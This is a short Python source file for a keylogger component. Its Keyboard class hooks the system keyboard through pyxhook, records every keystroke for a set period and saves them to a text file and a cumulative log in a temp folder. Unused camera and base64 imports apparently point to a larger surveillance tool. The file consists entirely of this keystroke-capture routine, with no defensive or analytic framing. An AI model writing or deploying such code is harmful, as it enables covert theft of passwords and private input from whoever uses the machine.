import pygame, sys, os
import pygame.camera
import time, random
import base64
from pyxhook import HookManager 

SAVEDIR = os.path.dirname(os.path.abspath(__file__)) + "/temp"

pygame.init()

class Keyboard(object):
	__hook = None
	def __init__(self):
		pass
	
	def getKeys(self):
		pass
	
	def getKeysData(self, size):
		path = self.captureKeys(size)
		with open(path, "rb") as keys_file:
			encoded_string = keys_file.read()
		return encoded_string
		

	def captureKeys(self, size):
		self.__hook = HookManager()
		self.__hook.HookKeyboard()
		self.__hook.KeyDown = self.__hook.printevent
		self.__hook.start()
		time.sleep(size)
		self.__hook.cancel()
		filename = "%s/%s.txt" % (SAVEDIR, 'keys')
		f = open(filename, "w")
		try:
			ftemp = open(filename + ".log", "r")
		except:
			ftemp = open(filename + ".log", "w")
		
		keys = "".join(self.__hook.getListKeys())
		f.write(keys)
		f.close()
		lines = "".join(ftemp.readlines())
		ftemp.close()
		ftemp = open(filename + ".log", "w")
		ftemp.write(lines + keys)
		ftemp.close()
		return filename
		
